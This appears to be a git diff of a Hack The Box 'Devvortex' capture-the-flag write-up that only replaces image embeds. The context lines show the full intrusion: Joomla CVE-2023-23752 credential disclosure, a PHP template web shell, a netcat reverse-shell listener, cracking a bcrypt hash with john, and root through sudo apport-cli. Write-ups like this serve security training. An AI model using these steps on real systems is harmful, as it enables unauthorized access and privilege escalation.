@@ -14,8 +14,8 @@ tags: ["tutorial"]
 ```
 sudo nmap -Pn -sT -sU -sC -sV 10.10.11.242
 ```
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/4cd30184-fed4-4548-8ee9-a091ef02f388)
 
-![[img/HTB-Devvortex/Pasted image 20240503124950.png]]
 
 ##### Whatweb
 
@@ -23,7 +23,8 @@ sudo nmap -Pn -sT -sU -sC -sV 10.10.11.242
 whatweb 10.10.11.242
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504134637.png | whatweb]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f7ab0b82-c9cf-4be3-890f-a707d9b7c44c)
+
 
 Key findings:
 
@@ -36,7 +37,7 @@ The IP address and domain were added to `/etc/hosts`:
 echo "10.10.14.242 devvortex.htb" | sudo tee -a /etc/hosts
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504134741.png | devvortex.htb]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/55866778-4e0b-4bb0-bcd5-066072be6006)
 
 
 ##### Directory Brute Force
@@ -45,7 +46,8 @@ echo "10.10.14.242 devvortex.htb" | sudo tee -a /etc/hosts
 ffuf -w /home/kali/Tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.devvortex.htb" -u http://devvortex.htb -fs 154 
 ```
 
-![[/HTB-Devvortex/Pasted image 20240503130655.png | ffuf]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/aa818584-a207-406f-832a-9ce1046e4682)
+
 
 Found: `dev.devvortex.htb`
 
@@ -55,11 +57,12 @@ I've added it to my **/etc/hosts** and proceeded to explore this website. Hitt
 echo '10.10.11.242        dev.devvortex.htb' | sudo tee -a /etc/hosts
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504135234.png | dev]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/d2ffe1ce-7def-45fa-81ee-2031b9c7f7e8)
+
 
 Navigating to the `/administrator` directory..
 
-![[/HTB-Devvortex/Pasted image 20240504135719.png | administrator | 1000]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/6969337a-10b3-4774-af60-eeeeb3ea3fee)
 
 
 ##### Enumerating Joomla
@@ -70,13 +73,13 @@ Useful Resources:
 https://hackertarget.com/attacking-enumerating-joomla/?ref=benheater.com#joomla-core-version
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
 
-![[/HTB-Devvortex/Pasted image 20240504141014.png | README.txt | 800]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/377a3324-fc35-4967-a920-d2b1fc63ac74)
 
-![[/HTB-Devvortex/Pasted image 20240504141557.png | joomla.xml | 800]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/3fd9d11f-18e1-4a2c-b3fd-2300a4a503fb)
 
 `Joomla 4.2.6` lets dig and search for some exploits
 
-![[/HTB-Devvortex/Pasted image 20240504142112.png | searchsploit]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/2b59140b-a62f-4f46-9832-db6f59657ef9)
 
 Running `searchsploit joomla 4.2.6` we can see that there is an unauthenticated information disclosure vulnerability we can try. 
 
@@ -106,7 +109,7 @@ sudo gem install paint
 ruby exploit.rb http://dev.devvortex.htb
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504144213.png | exploit]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e9145417-6342-4506-a407-efb05a9171b3)
 
 https://github.com/c0d3cr4f73r/CVE-2023-23752.git
 
@@ -115,7 +118,7 @@ https://github.com/c0d3cr4f73r/CVE-2023-23752.git
 
 First thing I tried, is to SSH into the server with those credentials, but my attempt failed. After all, these credentials enabled Joomla Administrator dashboard access:
 
-![[/HTB-Devvortex/Pasted image 20240504145258.png | 1000]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/ee594bb3-8bee-4457-950f-cda5e53b116a)
 
 Since this is a CMS, based on PHP, we'll navigate to the templates and create a PHP file/page to execute system commands, for RCE.
 `System ➡ Templates ➡ Administrator Templates`.
@@ -130,7 +133,8 @@ Establishing a connection using netcat:
 nc -l 4444
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504145952.png]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/115d4dcc-ae93-432a-9c0c-8757bc1ccb78)
+
 
 Stabilizing the shell:
 
@@ -269,7 +273,8 @@ echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash
 john --wordlist=/home/kali/Tools/rockyou.txt hash
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504152636.png | hash cracking]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/f64bbd88-8ac4-43da-b81d-dc5acc2a9dc5)
+
 
 Let’s login with these credentials Via SSH.
 
@@ -277,7 +282,7 @@ Let’s login with these credentials Via SSH.
 ssh logan@devvortex.htb
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504154147.png | user.txt]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/7ab345ec-6e40-49e3-b702-bf6d1b208234)
 
 I found a binary file we can use this binary with the `sudo` command without a password.
 
@@ -285,7 +290,7 @@ I found a binary file we can use this binary with the `sudo` command without a p
 sudo -l
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504154501.png | sudo -l]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/1eb72de5-c94c-4822-a317-0b4c9623b2fe)
 
 I could run `/usr/bin/apport-cliwith` sudo, but needed to figure out how to exploit it. Quick research revealed a CVE:
 
@@ -297,17 +302,17 @@ A privilege escalation attack was found in apport-cli 2.26.0 and earlier which i
 sudo /usr/bin/apport-cli -f
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504155837.png]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/9db6f8ac-26ab-4930-83a2-ea577b01b3d7)
 
-![[/HTB-Devvortex/Pasted image 20240504155848.png]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e18a473d-4722-4d3f-9826-686dc2c1ef7b)
 
-![[/HTB-Devvortex/Pasted image 20240504155856.png]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/dc77a946-1b15-4c61-8949-b8a9ea573959)
 
 ```
 !id
 !/bin/bash
 ```
 
-![[/HTB-Devvortex/Pasted image 20240504160045.png]]
+![image](https://github.com/c0d3cr4f73r/c0d3cr4f73r.github.io/assets/66146701/e21fb320-3251-44cb-be99-d3137ed42f51)
 
 Collecting the root flag..
